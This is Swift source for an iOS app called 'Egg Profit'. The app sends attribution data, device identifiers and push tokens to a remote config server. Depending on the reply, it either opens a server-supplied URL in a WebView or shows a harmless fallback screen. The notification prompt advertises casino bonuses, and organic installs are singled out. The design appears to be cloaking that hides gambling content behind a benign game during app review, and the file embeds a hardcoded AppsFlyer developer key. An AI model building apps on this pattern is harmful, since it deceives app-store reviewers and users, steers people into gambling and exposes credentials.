import SwiftUI
import WebKit
import UserNotifications
import Network
import Firebase
import FirebaseMessaging
import AppsFlyerLib

struct SplashEggProfitAppView: View {
    
    @StateObject private var manager = EggLaunchManager()
    var body: some View {
        ZStack {
            if manager.activePhase == .hatching || manager.showPrompt {
                hatchingScreen
            }
            
            if manager.showPrompt {
                PushNotificationsRequestPermissionCustomView {
                    manager.requestNotificationAccess()
                } declineAction: {
                    
                    UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
                    manager.showPrompt = false
                    manager.sendSetupData()
                }
            } else {
                switch manager.activePhase {
                case .hatching:
                    EmptyView()
                case .profitDisplay:
                    if let link = manager.profitLink {
                        MainProfitInterface(profitPath: link.absoluteString)
                    } else {
                        ContentView()
                    }
                case .backup:
                    ContentView()
                case .noYield:
                    strayScreen
                }
            }
        }
    }
    
    private var hatchingScreen: some View {
        GeometryReader { layout in
            
            ZStack {
                Image("splash_bg")
                    .resizable()
                    .scaledToFill()
                    .frame(width: layout.size.width, height: layout.size.height)
                    .ignoresSafeArea()
                
                VStack {
                    Image("splash_icon")
                        .resizable()
                        .frame(width: 350, height: 400)
                    
                    Image("loading_icon")
                        .resizable()
                        .frame(width: 200, height: 55)
                        .padding(.top, 32)
                        .offset(x: 20, y: -120)
                    
                    Spacer()
                }
                .onAppear {
                    animating = true
                }
            }
        }
        .ignoresSafeArea()
    }
    
    @State var animating = false
    
    private var strayScreen: some View {
        GeometryReader { layout in
            
            ZStack {
                Image("internet_check_bg")
                    .resizable()
                    .scaledToFill()
                    .frame(width: layout.size.width, height: layout.size.height)
                    .ignoresSafeArea()
                
                VStack {
                    Image("internet_check")
                        .resizable()
                        .frame(width: 330, height: 230)
                }
            }
            
        }
        .ignoresSafeArea()
    }
    
}

#Preview {
    SplashEggProfitAppView()
}


struct PushNotificationsRequestPermissionCustomView: View {
    var acceptAction: () -> Void
    var declineAction: () -> Void
    
    var body: some View {
        GeometryReader { layout in
            let isHorizontal = layout.size.width > layout.size.height
            
            ZStack {
                if isHorizontal {
                    Image("egg_profit_app_push_l")
                        .resizable()
                        .scaledToFill()
                        .frame(width: layout.size.width, height: layout.size.height)
                        .ignoresSafeArea()
                } else {
                    Image("egg_profit_app_push")
                        .resizable()
                        .scaledToFill()
                        .frame(width: layout.size.width, height: layout.size.height)
                        .ignoresSafeArea()
                }
                
                VStack(spacing: isHorizontal ? 5 : 10) {
                    Spacer()
                    
                    Text("Allow notifications about bonuses and promos".uppercased())
                        .font(.custom("AlfaSlabOne-Regular", size: 20))
                        .multilineTextAlignment(.center)
                        .foregroundColor(.white)
                        .padding(.horizontal, 8)
                    
                    Text("Stay tuned with best offers from our casino")
                        .font(.custom("AlfaSlabOne-Regular", size: 15))
                        .multilineTextAlignment(.center)
                        .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
                        .padding(.horizontal, 52)
                        .padding(.top, 4)
                    
                    Button(action: acceptAction) {
                        Image("bonus_claim_btn")
                            .resizable()
                            .frame(height: 60)
                    }
                    .frame(width: 350)
                    .padding(.top, 24)
                    
                    Button(action: declineAction) {
                        Text("SKIP")
                            .font(.custom("AlfaSlabOne-Regular", size: 15))
                            .multilineTextAlignment(.center)
                            .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
                    }
                    
                    Spacer()
                        .frame(height: isHorizontal ? 30 : 50)
                }
                .padding(.horizontal, isHorizontal ? 20 : 0)
            }
            
        }
        .ignoresSafeArea()
    }
}

class EggLaunchManager: ObservableObject {
    @Published var activePhase: Phase = .hatching
    @Published var profitLink: URL?
    @Published var showPrompt = false
    private var conversionInfo: [AnyHashable: Any] = [:]
    private var isInitialLaunch: Bool {
        !UserDefaults.standard.bool(forKey: "hasLaunched")
    }
    enum Phase {
        case hatching
        case profitDisplay
        case backup
        case noYield
    }
    init() {
        NotificationCenter.default.addObserver(self, selector: #selector(handleConversionInfo(_:)), name: NSNotification.Name("ConversionDataReceived"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(handleTokenRefresh(_:)), name: NSNotification.Name("FCMTokenUpdated"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(retrySetup), name: NSNotification.Name("RetryConfig"), object: nil)
        checkConnectionAndProceed()
    }
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
    private func checkConnectionAndProceed() {
        let connectionChecker = NWPathMonitor()
        connectionChecker.pathUpdateHandler = { status in
            DispatchQueue.main.async {
                if status.status != .satisfied {
                    self.handleNoYield()
                }
            }
        }
        connectionChecker.start(queue: DispatchQueue.global())
    }
    @objc private func handleConversionInfo(_ notification: Notification) {
        conversionInfo = (notification.userInfo ?? [:])["conversionData"] as? [AnyHashable: Any] ?? [:]
        processConversionInfo()
    }
    @objc private func handleConversionError(_ notification: Notification) {
        handleSetupError()
    }
    @objc private func handleTokenRefresh(_ notification: Notification) {
        if let updatedToken = notification.object as? String {
            UserDefaults.standard.set(updatedToken, forKey: "fcm_token")
            sendSetupData()
        }
    }
    @objc private func handleTempPath(_ notification: Notification) {
        guard let details = notification.userInfo as? [String: Any],
              let pathStr = details["tempUrl"] as? String else {
            return
        }
        DispatchQueue.main.async {
            self.profitLink = URL(string: pathStr)!
            self.activePhase = .profitDisplay
        }
    }
    @objc private func retrySetup() {
        checkConnectionAndProceed()
    }
    private func processConversionInfo() {
        
        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
            DispatchQueue.main.async {
                self.activePhase = .backup
            }
            return
        }
        
        if isInitialLaunch {
            if let originStatus = conversionInfo["af_status"] as? String, originStatus == "Organic" {
                DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
                    self.checlIfOrganic()
                }
                return
            }
        }
        
        if let tempPath = UserDefaults.standard.string(forKey: "temp_url"), !tempPath.isEmpty {
            profitLink = URL(string: tempPath)
            self.activePhase = .profitDisplay
            return
        }
        if profitLink == nil {
            if !UserDefaults.standard.bool(forKey: "accepted_notifications") && !UserDefaults.standard.bool(forKey: "system_close_notifications") {
                checkAndShowPrompt()
            } else {
                sendSetupData()
            }
        }
    }
    
    private func checlIfOrganic() {
        let url = URL(string: "https://gcdsdk.appsflyer.com/install_data/v4.0/id6753625851")!
        var components = URLComponents(url: url, resolvingAgainstBaseURL: true)!
        let queryItems: [URLQueryItem] = [
            URLQueryItem(name: "devkey", value: "efbC7vNvdEdhD44rPp5wS4"),
            URLQueryItem(name: "device_id", value: AppsFlyerLib.shared().getAppsFlyerUID()),
        ]
        components.queryItems = components.queryItems.map { $0 + queryItems } ?? queryItems
        
        var request = URLRequest(url: components.url!)
        request.httpMethod = "GET"
        request.timeoutInterval = 10
        request.allHTTPHeaderFields = ["accept": "application/json"]
        
        URLSession.shared.dataTask(with: request) { data, response, issue in
            if let _ = issue {
                self.handleSetupError()
            }
            
            guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
                self.handleSetupError()
                return
            }
            
            if let data = data {
                
                do {
                    guard let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] else {
                        print("Failed to decode JSON as dictionary")
                        self.handleSetupError()
                        return
                    }
                    
                    self.conversionInfo = json
                    self.sendSetupData()
                } catch {
                    print("Error: \(error)")
                    self.handleSetupError()
                }
            } else {
                self.handleSetupError()
            }
        }.resume()
    }
    
    func sendSetupData() {
        guard let targetEndpoint = URL(string: "https://eggprofit.com/config.php") else {
            handleSetupError()
            return
        }
        var postReq = URLRequest(url: targetEndpoint)
        postReq.httpMethod = "POST"
        postReq.setValue("application/json", forHTTPHeaderField: "Content-Type")
        var dataPayload = conversionInfo
        dataPayload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
        dataPayload["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
        dataPayload["os"] = "iOS"
        dataPayload["store_id"] = "id6753625851"
        dataPayload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
        dataPayload["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
        dataPayload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
        do {
            postReq.httpBody = try JSONSerialization.data(withJSONObject: dataPayload)
        } catch {
            handleSetupError()
            return
        }
        URLSession.shared.dataTask(with: postReq) { responseData, responseObj, issue in
            DispatchQueue.main.async {
                if let _ = issue {
                    self.handleSetupError()
                    return
                }
                guard let httpResponse = responseObj as? HTTPURLResponse, httpResponse.statusCode == 200,
                      let responseData = responseData else {
                    self.handleSetupError()
                    return
                }
                do {
                    if let parsedResponse = try JSONSerialization.jsonObject(with: responseData) as? [String: Any] {
                        if let isSuccessful = parsedResponse["ok"] as? Bool, isSuccessful {
                            if let pathStr = parsedResponse["url"] as? String, let validityTime = parsedResponse["expires"] as? TimeInterval {
                                UserDefaults.standard.set(pathStr, forKey: "saved_url")
                                UserDefaults.standard.set(validityTime, forKey: "saved_expires")
                                UserDefaults.standard.set("WebView", forKey: "app_mode")
                                UserDefaults.standard.set(true, forKey: "hasLaunched")
                                self.profitLink = URL(string: pathStr)
                                self.activePhase = .profitDisplay
                                if self.isInitialLaunch {
                                    self.checkAndShowPrompt()
                                }
                            }
                        } else {
                            self.enableBackupMode()
                        }
                    }
                } catch {
                    self.handleSetupError()
                }
            }
        }.resume()
    }
    private func handleSetupError() {
        if let cachedPath = UserDefaults.standard.string(forKey: "saved_url"), let validPath = URL(string: cachedPath) {
            profitLink = validPath
            activePhase = .profitDisplay
        } else {
            enableBackupMode()
        }
    }
    private func enableBackupMode() {
        UserDefaults.standard.set("Funtik", forKey: "app_mode")
        UserDefaults.standard.set(true, forKey: "hasLaunched")
        DispatchQueue.main.async {
            self.activePhase = .backup
        }
    }
    private func handleNoYield() {
        let currentMode = UserDefaults.standard.string(forKey: "app_mode")
        if currentMode == "WebView" {
            DispatchQueue.main.async {
                self.activePhase = .noYield
            }
        } else {
            enableBackupMode()
        }
    }
    private func checkAndShowPrompt() {
        if let lastPromptTime = UserDefaults.standard.value(forKey: "last_notification_ask") as? Date,
           Date().timeIntervalSince(lastPromptTime) < 259200 {
            sendSetupData()
            return
        }
        showPrompt = true
    }
    func requestNotificationAccess() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, issue in
            DispatchQueue.main.async {
                if granted {
                    UserDefaults.standard.set(true, forKey: "accepted_notifications")
                    UIApplication.shared.registerForRemoteNotifications()
                } else {
                    UserDefaults.standard.set(false, forKey: "accepted_notifications")
                    UserDefaults.standard.set(true, forKey: "system_close_notifications")
                }
                self.sendSetupData()
                self.showPrompt = false
            }
        }
    }
}

